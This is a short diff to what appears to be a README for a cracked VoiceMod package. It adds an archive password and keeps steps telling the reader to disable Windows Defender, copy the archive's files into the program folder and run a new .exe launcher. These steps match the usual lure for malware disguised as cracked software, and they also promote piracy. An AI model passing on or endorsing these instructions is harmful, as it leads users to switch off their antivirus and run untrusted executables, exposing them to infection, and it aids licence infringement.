@@ -6,7 +6,7 @@ What is it?
 
 How to install?
 1. Install archive.
-2. Open with WinRar.
+2. Open with WinRar. - Password: DUMPER
 3. Disable Windows Defender [Need to process crack]
 4. Copy files from archive to VoiceMod folder.
 5. Open VoiceMod using new .exe launcher.
